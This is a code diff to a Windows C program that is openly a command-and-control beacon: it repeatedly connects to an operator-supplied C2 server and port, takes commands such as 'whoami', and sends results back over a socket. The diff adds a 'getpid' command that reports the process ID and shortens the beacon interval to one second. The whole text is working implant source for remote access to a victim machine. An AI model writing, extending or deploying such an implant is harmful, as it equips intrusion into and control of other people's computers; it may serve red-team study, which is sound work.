@@ -1,3 +1,4 @@
+// ver 0.1.1
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
@@ -7,6 +8,13 @@
 
 // DEBUG, TEMP.
 //#include <iostream>
+
+
+DWORD getpid(){
+	DWORD pid;
+	pid = GetCurrentProcessId();
+	return pid;
+}
 
 void whoami(char* returnval)
 {
@@ -140,6 +148,24 @@ void StartBeacon(char* C2Server, int C2Port)
 
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
+			else if (strcmp(RecvData, "getpid\n") == 0) {
+				DWORD pid;
+				char cpid[6];
+				pid = getpid();
+				// Convert DWORD to char (using base 10)
+				_ultoa(pid,cpid,10);
+				
+				// preparing buffer to send
+				char buffer[20];
+				memset(buffer, 0, sizeof(buffer));
+				strcat(buffer,"Current PID: ");
+				strcat(buffer,cpid);
+
+				send(tcpsock,buffer,strlen(buffer)+1,0);
+				// clear buffers
+				memset(buffer, 0, sizeof(buffer));
+				memset(RecvData, 0, sizeof(RecvData));
+			}
 			else if (strcmp(RecvData, "whoami\n") == 0) {
 				char buffer[257] = ""; // reserve buffer with length of 257 bytes
 				whoami(buffer); // call whoami function
@@ -213,7 +239,7 @@ int main(int argc, char **argv)
 		while (true) {
 				// BEACONING
 				// NEED TO IMPLEMENT RANDOM DELAY
-				Sleep(5000); // 1000 ms = 1s
+				Sleep(1000); // 1000 ms = 1s
 
 				StartBeacon(argv[1],port);
 		}
@@ -223,7 +249,7 @@ int main(int argc, char **argv)
 			while (true) {
 				// BEACONING
 				// NEED TO IMPLEMENT RANDOM DELAY
-				Sleep(5000); // 1000 ms = 1s
+				Sleep(1000); // 1000 ms = 1s
 
 				StartBeacon(host,port);
 		}
